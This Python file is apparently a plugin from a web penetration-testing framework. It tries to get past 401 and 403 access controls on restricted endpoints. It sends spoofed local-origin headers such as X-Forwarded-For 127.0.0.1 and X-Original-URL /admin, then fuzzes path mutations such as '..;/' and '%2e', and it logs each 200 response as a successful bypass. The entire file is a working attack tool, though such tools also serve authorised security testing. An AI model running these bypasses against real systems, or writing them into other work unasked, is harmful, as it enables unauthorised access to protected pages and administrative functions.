import aiohttp
import asyncio
from urllib.parse import urlparse

PRIORITY = 30
TYPE = "Active Exploitation"
DESCRIPTION = "Async 403/401 Bypass Engine (Header & Path Fuzzing)"

BYPASS_HEADERS = [
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"}
]

PATH_PAYLOADS = ["%2e", "/.", ";", "..;/", "/%20", "%09"]

async def try_bypass(session, url, finding_list):
    # 1. Header Fuzzing
    for headers in BYPASS_HEADERS:
        try:
            async with session.get(url, headers=headers, timeout=5, allow_redirects=False) as r:
                if r.status == 200:
                    finding_list.append(f"Header Bypass: {headers} -> {url}")
                    return
        except: pass

    # 2. Path Fuzzing
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path.strip("/")
    
    for p in PATH_PAYLOADS:
        # Construct mutations: /%2e/admin, /admin/., etc.
        mutations = [
            f"{base}/{p}/{path}",
            f"{base}/{path}{p}",
            f"{base}/{path}/{p}"
        ]
        for m_url in mutations:
            try:
                async with session.get(m_url, timeout=5, allow_redirects=False) as r:
                    if r.status == 200:
                        finding_list.append(f"Path Bypass: {m_url}")
                        return
            except: pass

async def run_async(kb):
    # Only target restricted pages found by other plugins
    # (e.g., from Nuclei, WebBuster, or Crawlers)
    targets = set()
    
    # Collect 403/401s from web paths
    for entry in kb.get("web_paths", []):
        # Entry format: [url, status, size]
        if len(entry) >= 2 and str(entry[1]) in ["403", "401"]:
            targets.add(entry[0])

    if not targets: return

    print(f"[*] Running {DESCRIPTION} on {len(targets)} restricted endpoints...")
    
    success_bypasses = []
    
    async with aiohttp.ClientSession() as session:
        tasks = [try_bypass(session, url, success_bypasses) for url in targets]
        await asyncio.gather(*tasks)

    if success_bypasses:
        print(f"    [+] BOOM! Bypassed access controls on {len(success_bypasses)} endpoints.")
        for b in success_bypasses:
            print(f"        - {b}")
        
        kb.update("bypass_findings", success_bypasses)

def run(kb):
    asyncio.run(run_async(kb))
